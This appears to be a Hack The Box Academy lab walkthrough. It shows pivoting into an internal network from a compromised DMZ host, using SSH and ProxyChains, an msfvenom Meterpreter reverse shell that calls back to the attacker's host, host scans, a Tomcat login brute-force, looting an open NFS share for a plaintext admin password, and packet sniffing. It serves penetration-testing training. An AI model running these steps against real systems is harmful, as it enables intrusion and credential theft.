# Internal Information Gathering

---

We've covered a ton of ground so far:

- Performed external information gathering
- Performed external port and service scanning
- Enumerated multiple services for misconfigurations and known vulnerabilities
- Enumerated and attacked 12 different web applications, with some resulting in no access, others granting file read or sensitive data access, and a few resulting in remote code execution on the underlying web server
- Obtained a hard-fought foothold in the internal network
- Performed pillaging and lateral movement to gain access as a more privileged user
- Escalated privileges to root on the web server
- Established persistence through the use of both a user/password pair and the root account's private key for fast SSH access back into the environment

---

## Setting Up Pivoting - SSH

With a copy of the root `id_rsa` (private key) file, we can use SSH port forwarding along with [ProxyChains](https://github.com/haad/proxychains) to start getting a picture of the internal network. To review this technique, check out the [Dynamic Port Forwarding with SSH and SOCKS Tunneling](https://academy.hackthebox.com/module/158/section/1426) section of the `Pivoting, Tunneling, and Port Forwarding` module.

We can use the following command to set up our SSH pivot using dynamic port forwarding: `ssh -D 8081 -i dmz01_key root@10.129.x.x`. This means we can proxy traffic from our attack host through port 8081 on the target to reach hosts inside the 172.16.8.0/23 subnet directly from our attack host.

In our first terminal, let's set up the SSH dynamic port forwarding command first:

Internal Information Gathering

```shell-session
swmpdnky@htb[/htb]$ ssh -D 8081 -i dmz01_key root@10.129.203.111

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 22 Jun 2022 12:08:31 AM UTC

  System load:                      0.21
  Usage of /:                       99.9% of 13.72GB
  Memory usage:                     65%
  Swap usage:                       0%
  Processes:                        458
  Users logged in:                  2
  IPv4 address for br-65c448355ed2: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.203.111
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:d30d
  IPv4 address for ens192:          172.16.8.120

  => / is using 99.9% of 13.72GB

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

97 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


You have mail.
Last login: Tue Jun 21 19:53:01 2022 from 10.10.14.15
root@dmz01:~#
```

We can confirm that the dynamic port forward is set up using `Netstat` or running an Nmap scan against our localhost address.

Internal Information Gathering

```shell-session
swmpdnky@htb[/htb]$ netstat -antp | grep 8081

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      122808/ssh          
tcp6       0      0 ::1:8081
```

Next, we need to modify the `/etc/proxychains.conf` to use the port we specified with our dynamic port forwarding command (8081 here).

Note: If you are working from the Pwnbox, be sure to save this private key down to your notes or a local file or you'll have to re-do all steps to get back to this point should you decide to pause for a while.

Internal Information Gathering

```shell-session
swmpdnky@htb[/htb]$ grep socks4 /etc/proxychains.conf 

#	 	socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5
socks4 	127.0.0.1 8081
```

Next, we can use Nmap with Proxychains to scan the dmz01 host on its' second NIC, with the IP address `172.16.8.120` to ensure everything is set up correctly.

Internal Information Gathering

```shell-session
swmpdnky@htb[/htb]$ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 21:15 EDT
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:80-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:80-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:22-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:21-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:8080-<><>-OK
Nmap scan report for 172.16.8.120
Host is up (0.13s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```

---

## Setting Up Pivoting - Metasploit

Alternatively, we can set up our pivoting using Metasploit, as covered in the [Meterpreter Tunneling & Port Forwarding](https://academy.hackthebox.com/module/158/section/1428) section of the Pivoting module. To achieve this, we can do the following:

First, generate a reverse shell in Elf format using `msfvenom`.

Internal Information Gathering

```shell-session
swmpdnky@htb[/htb]$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

```

Next, transfer the host to the target. Since we have SSH, we can upload it to the target using SCP.

Internal Information Gathering

```shell-session
swmpdnky@htb[/htb]$ scp -i dmz01_key shell.elf root@10.129.203.111:/tmp

shell.elf                                                                      100%  207     1.6KB/s   00:00
```

Now, we'll set up the Metasploit `exploit/multi/handler`.

Internal Information Gathering

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.14.15 
lhost => 10.10.14.15
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 443
LPORT => 443
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.15:443
```

Execute the `shell.elf` file on the target system:

Internal Information Gathering

```shell-session
root@dmz01:/tmp# chmod +x shell.elf 
root@dmz01:/tmp# ./shell.elf 
```

If all goes as planned, we'll catch the Meterpreter shell using the multi/handler, and then we can set up routes.

Internal Information Gathering

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.15:443 
[*] Sending stage (989032 bytes) to 10.129.203.111
[*] Meterpreter session 1 opened (10.10.14.15:443 -> 10.129.203.111:58462 ) at 2022-06-21 21:28:43 -0400

(Meterpreter 1)(/tmp) > getuid
Server username: root
```

Next, we can set up routing using the `post/multi/manage/autoroute` module.

Internal Information Gathering

```shell-session
(Meterpreter 1)(/tmp) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute 
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> show options 

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, de
                                       fault)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set subnet 172.16.8.0
subnet => 172.16.8.0
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.203.111
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```

For a refresher, consult the [Crafting Payloads with MSFvenom](https://academy.hackthebox.com/module/115/section/1205) section of the `Shells & Payloads` module and the [Introduction to MSFVEnom](https://academy.hackthebox.com/module/39/section/418) section of the `Using the Metasploit Framework` module.

---

## Host Discovery - 172.16.8.0/23 Subnet - Metasploit

Once both options are set up, we can begin hunting for live hosts. Using our Meterpreter session, we can use the `multi/gather/ping_sweep` module to perform a ping sweep of the `172.16.8.0/23` subnet.

Internal Information Gathering

```shell-session
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> show options 

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on

[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set rhosts 172.16.8.0/23
rhosts => 172.16.8.0/23
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> run

[*] Performing ping sweep for IP range 172.16.8.0/23
[+] 	172.16.8.3 host found
[+] 	172.16.8.20 host found
[+] 	172.16.8.50 host found
[+] 	172.16.8.120 host found
```

---

## Host Discovery - 172.16.8.0/23 Subnet - SSH Tunnel

Alternatively, we could do a ping sweep or use a [static Nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) from the dmz01 host.

We get quick results with this Bash one-liner ping sweep:

Internal Information Gathering

```shell-session
root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from

64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms
```

We could also use Nmap through Proxychains to enumerate hosts in the 172.16.8.0/23 subnet, but it will be very slow and take ages to finish.

Our host discovery yields three additional hosts:

- 172.16.8.3
- 172.16.8.20
- 172.16.8.50

We can now dig deeper into each of these hosts and see what we turn up.

---

## Host Enumeration

Let's continue our enumeration using a static Nmap binary from the dmz01 host. Try uploading the binary using one of the techniques taught in the [File Transfers](https://academy.hackthebox.com/module/24/section/159) module.

Internal Information Gathering

```shell-session

root@dmz01:/tmp# ./nmap --open -iL live_hosts 

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-06-22 01:42 UTC
Unable to find nmap-services! Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.

Nmap scan report for 172.16.8.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00064s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:B9:16:51 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00037s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B9:EC:36 (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00038s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:B9:B0:89 (Unknown)

Nmap done: 3 IP addresses (3 hosts up) scanned in 131.36 second
```

From the Nmap output, we can gather the following:

- 172.16.8.3 is a Domain Controller because we see open ports such as Kerberos and LDAP. We can likely leave this to the side for now as its unlikely to be directly exploitable (though we can come back to that)
- 172.16.8.20 is a Windows host, and the ports `80/HTTP` and `2049/NFS` are particularly interesting
- 172.16.8.50 is a Windows host as well, and port `8080` sticks out as non-standard and interesting

We could run a full TCP port scan in the background while digging into some of these hosts.

---

## Active Directory Quick Hits - SMB NULL SESSION

We can quickly check against the Domain Controller for SMB NULL sessions. If we can dump the password policy and a user list, we could try a measured password spraying attack. If we know the password policy, we can time our attacks appropriately to avoid account lockout. If we can't find anything else, we could come back and use `Kerbrute` to enumerate valid usernames from various user lists and after enumerating (during a real pentest) potential usernames from the company's LinkedIn page. With this list in hand, we could try 1-2 spraying attacks and hope for a hit. If that still does not work, depending on the client and assessment type, we could ask them for the password policy to avoid locking out accounts. We could also try an ASREPRoasting attack if we have valid usernames, as discussed in the `Active Directory Enumeration & Attacks` module.

Internal Information Gathering

```shell-session
swmpdnky@htb[/htb]$ proxychains enum4linux -U -P 172.16.8.3

ProxyChains-3.1 (http://proxychains.sf.net)
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jun 21 21:49:47 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 172.16.8.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 172.16.8.3    |
 ================================================== 
[E] Can't find workgroup/domain


 =================================== 
|    Session Check on 172.16.8.3    |
 =================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 172.16.8.3 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ========================================= 
|    Getting domain SID for 172.16.8.3    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:445-<><>-OK
Domain Name: INLANEFREIGHT
Domain Sid: S-1-5-21-2814148634-3729814499-1637837074
[+] Host is part of a domain (not a workgroup)

 =========================== 
|    Users on 172.16.8.3    |
 =========================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ================================================== 
|    Password Policy Information for 172.16.8.3    |
 ================================================== 
[E] Unexpected error from polenum:
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:139-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:445-<><>-OK


[+] Attaching to 172.16.8.3 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:172.16.8.3)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient

enum4linux complete on Tue Jun 21 21:50:07 2022
```

Unfortunately for us, this is a dead-end.

---

## 172.16.8.50 - Tomcat

Our earlier Nmap scan showed port 8080 open on this host. Browsing to `http://172.16.8.50:8080` shows the latest version of Tomcat 10 installed. Though there are no public exploits for it, we can try to brute-force the Tomcat Manager login as shown in the [Attacking Tomcat](https://academy.hackthebox.com/module/113/section/1211) section of the `Attacking Common Applications` module. We can start another instance of Metasploit using Proxychains by typing `proxychains msfconsole` to be able to pivot through the compromised dmz01 host if we don't have routing set up via a Meterpreter session. We can then use the `auxiliary/scanner/http/tomcat_mgr_login` module to attempt to brute-force the login.

Internal Information Gathering

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 172.16.8.50
rhosts => 172.16.8.50
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
stop_on_success => true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK

[!] No active DB -- Credential data will not be saved!
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:admin (Incorrect)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:manager (Incorrect)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:role1 (Incorrect)

<SNIP>

|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
[-] 172.16.8.50:8080 - LOGIN FAILED: tomcat:changethis (Incorrect)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We do not get a successful login, so this appears to be a dead-end and not worth exploring further. If we came across a Tomcat Manager login page exposed to the internet, we'd probably want to record it as a finding since an attacker could potentially brute-force it and use it to obtain a foothold. During an internal, we would only want to report it if we could get in via weak credentials and upload a JSP web shell. Otherwise, seeing on an internal network is normal if it is well locked down.

---

## Enumerating 172.16.8.20 - DotNetNuke (DNN)

From the Nmap scan, we saw ports `80` and `2049` open. Let's dig into each of these. We can check out what's on port 80 using `cURL` from our attack host using the command `proxychains curl http://172.16.8.20`. From the HTTP response, it looks like [DotNetNuke (DNN)](https://www.dnnsoftware.com/) is running on the target. This is a CMS written in .NET, basically the WordPress of .NET. It has suffered from a few critical flaws over the years and also has some built-in functionality that we may be able to take advantage of. We can confirm this by browsing directly to the target from our attack host, passing the traffic through the SOCKS proxy.

We can set this up in Firefox as follows:

![text](https://academy.hackthebox.com/storage/modules/163/ff_socks.png)

Browsing to the page confirms our suspicions.

![text](https://academy.hackthebox.com/storage/modules/163/dnn_homepage.png)

Browsing to `http://172.16.8.20/Login?returnurl=%2fadmin` shows us the admin login page. There is also a page to register a user. We attempt to register an account but receive the message:

`An email with your details has been sent to the Site Administrator for verification. You will be notified by email when your registration has been approved. In the meantime you can continue to browse this site.`

In my experience, it is highly unlikely that any type of site administrator will approve a strange registration, though it's worth trying to cover all of our bases.

Putting DNN aside, for now, we go back to our port scan results. Port 2049, NFS, is always interesting to see. If the NFS server is misconfigured (which they often are internally), we can browse NFS shares and potentially uncover some sensitive data. As this is a development server (due to the in-process DNN installation and the `DEV01` hostname) so it's worth digging into. We can use [showmount](https://linux.die.net/man/8/showmount) to list exports, which we may be able to mount and browse similar to any other file share. We find one export, `DEV01`, that is accessible to everyone (anonymous access). Let's see what it holds.

Internal Information Gathering

```shell-session
swmpdnky@htb[/htb]$ proxychains showmount -e 172.16.8.20

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:111-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:2049-<><>-OK
Export list for 172.16.8.20:
/DEV01 (everyone)
```

We can't mount the NFS share through Proxychains, but luckily we have root access to the dmz01 host to try. We see a few files related to DNN and a `DNN` subdirectory.

Internal Information Gathering

```shell-session
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
root@dmz01:/tmp# cd DEV01/
root@dmz01:/tmp/DEV01# ls

BuildPackages.bat            CKToolbarButtons.xml  DNN       WatchersNET.CKEditor.sln
CKEditorDefaultSettings.xml  CKToolbarSets.xml     
```

The `DNN` subdirectory is very interesting as it contains a `web.config` file. From our discussions on pillaging throughout the `Penetration Tester Path`, we know that config files can often contain credentials, making them a key target during any assessment.

Internal Information Gathering

```shell-session
root@dmz01:/tmp/DEV01# cd DNN
root@dmz01:/tmp/DEV01/DNN# ls

App_LocalResources                CKHtmlEditorProvider.cs  Options.aspx                 Web
Browser                           Constants                Options.aspx.cs              web.config
bundleconfig.json                 Content                  Options.aspx.designer.cs     web.Debug.config
CKEditorOptions.ascx              Controls                 packages.config              web.Deploy.config
CKEditorOptions.ascx.cs           Extensions               Properties                   web.Release.config
CKEditorOptions.ascx.designer.cs  Install                  UrlControl.ascx
CKEditorOptions.ascx.resx         Module                   Utilities
CKFinder                          Objects                  WatchersNET.CKEditor.csproj

root@dmz01:/tmp/DEV01/DNN# 
```

Checking the contents of the web.config file, we find what appears to be the administrator password for the DNN instance.

Internal Information Gathering

```shell-session
root@dmz01:/tmp/DEV01/DNN# cat web.config 

<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
```

Before we move on, since we have root access on `dmz01` via SSH, we can run `tcpdump` as it's on the system. It can never hurt to "listen on the wire" whenever possible during a pentest and see if we can grab any cleartext credentials or generally uncover any additional information that may be useful for us. We'll typically do this during an Internal Penetration Test when we have our own physical laptop or a VM that we control inside the client's network. Some testers will run a packet capture the entire time (rarely, clients will even request this), while others will run it periodically during the first day or so to see if they can capture anything.

Internal Information Gathering

```shell-session
root@dmz01:/tmp# tcpdump -i ens192 -s 65535 -w ilfreight_pcap

tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 65535 bytes
^C2027 packets captured
2033 packets received by filter
0 packets dropped by kernel
```

We could now transfer this down to our host and open it in `Wireshark` to see if we were able to capture anything. This is covered briefly in the [Interacting with Users](https://academy.hackthebox.com/module/67/section/630) section of the `Windows Privilege Escalation` module. For a more in-depth study, consult the [Intro to Network Traffic Analysis](https://academy.hackthebox.com/module/details/81) module.

After transferring the file down to our host, we open it in Wireshark but see that nothing was captured. If we were on a user VLAN or other "busy" area of the network, we might have considerable data to dig through, so it's always worth a shot.

---

## Moving On

At this point, we have dug into the other "live" hosts we can reach and attempted to sniff network traffic. We could run a full port scan of these hosts as well, but we have plenty to move forward with for now. Let's see what we can do with the DNN credentials we obtained from the `web.config` file pillaged from the open NFS share.